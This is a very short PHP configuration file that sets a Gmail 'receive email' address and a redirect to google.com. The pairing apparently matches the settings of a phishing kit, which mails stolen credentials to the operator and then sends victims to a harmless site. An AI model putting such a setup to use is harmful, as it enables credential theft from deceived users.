<?php 
$Receive_email="mjjacksonbtech@gmail.com";
$redirect="https://www.google.com/";
?>